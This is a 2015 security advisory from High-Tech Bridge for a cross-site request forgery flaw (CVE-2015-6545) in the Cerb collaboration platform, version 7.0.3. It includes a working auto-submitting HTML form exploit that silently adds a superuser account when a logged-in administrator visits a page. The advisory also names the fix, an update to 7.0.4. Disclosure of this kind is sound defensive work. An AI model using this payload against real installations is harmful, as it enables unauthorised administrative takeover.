@@ -1,0 +1,81 @@
+Advisory ID: HTB23269
+Product: Cerb
+Vendor: Webgroup Media LLC
+Vulnerable Version(s): 7.0.3 and probably prior
+Tested Version: 7.0.3
+Advisory Publication:  August 12, 2015  [without technical details]
+Vendor Notification: August 12, 2015 
+Vendor Patch: August 14, 2015 
+Public Disclosure: September 2, 2015 
+Vulnerability Type: Cross-Site Request Forgery [CWE-352]
+CVE Reference: CVE-2015-6545
+Risk Level: Medium 
+CVSSv2 Base Score: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered CSRF vulnerability in Cerb platform, which can be exploited to perform Cross-Site Request Forgery attacks against administrators of vulnerable web application to add administrate accounts into the system.  
+
+The vulnerability exists due to failure of the "/ajax.php" script to properly verify the source of incoming HTTP request. Taking into consideration that Cerb is a business-critical application, this security flaw may be quite dangerous if exploited by malicious attackers.
+
+A simple exploit below will add admin user into the system when a logged-in victim opens a malicious page with the exploit:
+
+
+<form action="http://[host]/ajax.php" method = "POST">
+<input type="hidden" name="c" value="config">
+<input type="hidden" name="a" value="handleSectionAction">
+<input type="hidden" name="section" value="workers">
+<input type="hidden" name="action" value="saveWorkerPeek">
+<input type="hidden" name="id" value="0">
+<input type="hidden" name="view_id" value="workers_cfg">
+<input type="hidden" name="do_delete" value="0">
+<input type="hidden" name="first_name" value="first name">
+<input type="hidden" name="last_name" value="last name">
+<input type="hidden" name="title" value="title">
+<input type="hidden" name="email" value="username@mail.com">
+<input type="hidden" name="at_mention_name" value="name">
+<input type="hidden" name="is_disabled" value="0">
+<input type="hidden" name="is_superuser" value="1">
+<input type="hidden" name="lang_code" value="en_US">
+<input type="hidden" name="timezone" value="Antarctica%2FTroll">
+<input type="hidden" name="time_format" value="D%2C+d+M+Y+h%3Ai+a">
+<input type="hidden" name="auth_extension_id" value="login.password">
+<input type="hidden" name="password_new" value="password">
+<input type="hidden" name="password_verify" value="password">
+<input type="hidden" name="calendar_id" value="new">
+<input value="submit" id="btn" type="submit" />
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Cerb 7.0.4
+
+More Information:
+https://github.com/wgm/cerb/commit/12de87ff9961a4f3ad2946c8f47dd0c260607144
+http://wiki.cerbweb.com/7.0#7.0.4
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23269 - https://www.htbridge.com/advisory/HTB23269 - Cross-Site Request Forgery in Cerb.
+[2] Cerb - http://www.cerberusweb.com/ - Cerb is a fast and flexible platform for enterprise collaboration, productivity, and automation.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
